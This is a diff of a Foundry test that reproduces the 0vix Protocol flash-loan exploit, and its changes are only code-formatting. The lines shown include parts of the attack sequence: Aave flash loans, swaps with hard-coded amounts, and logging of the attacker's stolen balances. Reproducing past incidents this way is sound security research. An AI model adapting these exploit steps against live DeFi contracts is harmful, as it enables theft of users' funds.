@@ -2,7 +2,15 @@
 pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
-import {ICErc20Delegate, IERC20, IUnitroller, IAaveFlashloan, IBalancerVault, Uni_Pair_V2, Uni_Pair_V3} from "./../interface.sol";
+import {
+    ICErc20Delegate,
+    IERC20,
+    IUnitroller,
+    IAaveFlashloan,
+    IBalancerVault,
+    Uni_Pair_V2,
+    Uni_Pair_V3
+} from "./../interface.sol";
 
 // @KeyInfo
 // Project: https://twitter.com/0vixProtocol
@@ -18,9 +26,15 @@ import {ICErc20Delegate, IERC20, IUnitroller, IAaveFlashloan, IBalancerVault, Un
 // Twitter : https://twitter.com/Mudit__Gupta/status/1651958883634536448
 
 interface IVGHST is IERC20 {
-    function enter(uint256 _amount) external returns (uint256);
-    function leave(uint256 _amount) external;
-    function convertVGHST(uint256 _share) external view returns (uint256 _ghst);
+    function enter(
+        uint256 _amount
+    ) external returns (uint256);
+    function leave(
+        uint256 _amount
+    ) external;
+    function convertVGHST(
+        uint256 _share
+    ) external view returns (uint256 _ghst);
 }
 
 interface IDMMLP {
@@ -145,19 +159,13 @@ contract ContractTest is Test {
         aaveV3Flashloan();
 
         emit log_named_decimal_uint(
-            "Attacker USDC balance after exploit",
-            USDC.balanceOf(address(this)),
-            USDC.decimals()
+            "Attacker USDC balance after exploit", USDC.balanceOf(address(this)), USDC.decimals()
         );
         emit log_named_decimal_uint(
-            "Attacker USDT balance after exploit",
-            USDT.balanceOf(address(this)),
-            USDT.decimals()
+            "Attacker USDT balance after exploit", USDT.balanceOf(address(this)), USDT.decimals()
         );
         emit log_named_decimal_uint(
-            "Attacker GHST balance after exploit",
-            GHST.balanceOf(address(this)),
-            GHST.decimals()
+            "Attacker GHST balance after exploit", GHST.balanceOf(address(this)), GHST.decimals()
         );
     }
     // aaveV3, aaveV2 FlashLoan callback
@@ -309,11 +317,7 @@ contract ContractTest is Test {
 
     function WMATICToUSDC() internal {
         UniV3Pair1.swap(
-            address(this),
-            true,
-            int256(WMATIC.balanceOf(address(this))),
-            70_888_624_962_869_287_903_104,
-            new bytes(0)
+            address(this), true, int256(WMATIC.balanceOf(address(this))), 70_888_624_962_869_287_903_104, new bytes(0)
         );
     }
 
@@ -366,13 +370,7 @@ contract ContractTest is Test {
             toInternalBalance: false
         });
         Balancer.swap(singleSwap, funds, 0, block.timestamp);
-        AlgebraPool3.swap(
-            address(this),
-            true,
-            900_000 * 1e6,
-            565_521_259_495_684_628_339_632_353_478_984,
-            new bytes(0)
-        );
+        AlgebraPool3.swap(address(this), true, 900_000 * 1e6, 565_521_259_495_684_628_339_632_353_478_984, new bytes(0));
         USDC.transfer(address(AavegotchiPoolPair), 310_000 * 1e6);
         AavegotchiPoolPair.swap(0, 158_000 * 1e18, address(this), new bytes(0));
     }
@@ -402,7 +400,7 @@ contract ContractTest is Test {
         amounts[0] = 1_950_000 * 1e18;
         amounts[1] = 6_800_000 * 1e6;
         amounts[2] = 2_300_000 * 1e6;
-        uint256[] memory modes = new uint[](3);
+        uint256[] memory modes = new uint256[](3);
         modes[0] = 0;
         modes[1] = 0;
         modes[2] = 0;
@@ -416,7 +414,7 @@ contract ContractTest is Test {
         uint256[] memory amounts = new uint256[](2);
         amounts[0] = 13_000_000 * 1e6;
         amounts[1] = 3_250_000 * 1e6;
-        uint256[] memory modes = new uint[](2);
+        uint256[] memory modes = new uint256[](2);
         modes[0] = 0;
         modes[1] = 0;
         aaveV2.flashLoan(address(this), assets, amounts, modes, address(this), "", 0);
